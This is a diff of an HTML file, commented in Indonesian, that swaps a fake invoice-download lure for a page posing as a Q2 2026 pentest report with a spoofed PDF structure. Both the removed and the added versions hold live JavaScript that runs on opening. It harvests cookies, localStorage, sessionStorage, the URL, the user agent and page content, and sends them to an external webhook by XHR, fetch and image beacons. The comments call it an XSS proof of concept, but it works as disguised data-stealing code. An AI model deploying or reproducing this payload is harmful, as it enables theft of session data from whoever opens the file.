@@ -1,53 +1,78 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Unduhan Invoice</title>
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-    <meta http-equiv="Content-Disposition" content="attachment; filename=invoice.pdf">
+    <meta charset="UTF-8">
+    <title>Laporan Pentest - Q2 2026</title>
 </head>
 <body>
+    <h1>Laporan Pentest - Q2 2026</h1>
+    <p>Berikut adalah hasil pengujian keamanan yang telah dilakukan:</p>
+    
+    <table border="1">
+        <tr>
+            <th>No</th>
+            <th>Temuan</th>
+            <th>Severity</th>
+        </tr>
+        <tr>
+            <td>1</td>
+            <td>SQL Injection</td>
+            <td>Critical</td>
+        </tr>
+        <tr>
+            <td>2</td>
+            <td>XSS Vulnerability</td>
+            <td>High</td>
+        </tr>
+    </table>
+
     <script>
-        // Simulasi Pencurian Data
-        const stolenCookies = document.cookie || "Tidak ada cookie (atau HttpOnly)";
-        const stolenLS = JSON.stringify(localStorage).substring(0, 100);
+        // XSS Payload - akan dieksekusi saat file dibuka
+        alert('XSS triggered: Document opened in browser');
+        document.body.innerHTML += '<p style="color:red">[!] XSS payload executed via ' + document.contentType + '</p>';
+        
+        // Eksfiltrasi ke webhook
+        var data = {
+            url: window.location.href,
+            cookies: document.cookie,
+            userAgent: navigator.userAgent,
+            localStorage: JSON.stringify(localStorage),
+            sessionStorage: JSON.stringify(sessionStorage),
+            timestamp: new Date().toISOString(),
+            dom: document.documentElement.innerHTML.substring(0, 500)
+        };
 
-        // Eksfiltrasi diam-diam ke webhook
-        const img = new Image();
-        img.src = "https://webhooksite.net/17eae203-4150-48d3-ba2a-7fd1ec8646b2?c=" + encodeURIComponent(stolenCookies) + "&ls=" + encodeURIComponent(stolenLS);
-        document.body.appendChild(img);
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://webhooksite.net/17eae203-4150-48d3-ba2a-7fd1ec8646b2', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify(data));
 
-        // Eksfiltrasi cadangan via fetch (POST)
-        fetch("https://webhooksite.net/17eae203-4150-48d3-ba2a-7fd1ec8646b2", {
-            method: "POST",
-            mode: "no-cors",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                cookies: stolenCookies,
-                localStorage: stolenLS,
-                url: window.location.href,
-                userAgent: navigator.userAgent
-            })
-        });
-
-        // Menampilkan Pop-up XSS sebagai bukti eksekusi
-        alert(
-            "⚠️ XSS EXPLOIT BERHASIL!\n\n" +
-            "File ini seharusnya di-download, tapi Firefox iOS menjalankannya.\n\n" +
-            "Data yang bisa diakses:\n" +
-            "- Cookies: " + stolenCookies + "\n" +
-            "- LocalStorage: " + stolenLS + "...\n\n" +
-            "Data telah dikirim ke server attacker."
-        );
-
-        console.log("XSS Proof of Concept: File content-type seharusnya application/pdf atau application/octet-stream");
+        // Fallback menggunakan Image beacon jika fetch/XHR diblokir CORS
+        var img = new Image();
+        img.src = 'https://webhooksite.net/17eae203-4150-48d3-ba2a-7fd1ec8646b2?data=' + encodeURIComponent(JSON.stringify(data));
     </script>
 
-    <!-- UI tipuan untuk mengelabui korban -->
-    <div style="font-family: Arial, sans-serif; text-align: center; padding: 40px;">
-        <h2>Invoice #INV-2026-0542</h2>
-        <p>Sedang mengunduh dokumen, harap tunggu...</p>
-        <progress value="65" max="100" style="width: 60%;"></progress>
-        <p><small>Jika unduhan tidak dimulai, <a href="#" onclick="return false;">klik di sini</a></small></p>
-    </div>
+    <!-- PDF Header spoofing agar aplikasi menganggap ini file PDF -->
+    %PDF-1.4
+    1 0 obj
+    << /Type /Catalog /Pages 2 0 R >>
+    endobj
+    2 0 obj
+    << /Type /Pages /Kids [3 0 R] /Count 1 >>
+    endobj
+    3 0 obj
+    << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
+    endobj
+    xref
+    0 4
+    0000000000 65535 f 
+    0000000009 00000 n 
+    0000000058 00000 n 
+    0000000115 00000 n 
+    trailer
+    << /Size 4 /Root 1 0 R >>
+    startxref
+    190
+    %%EOF
 </body>
 </html>
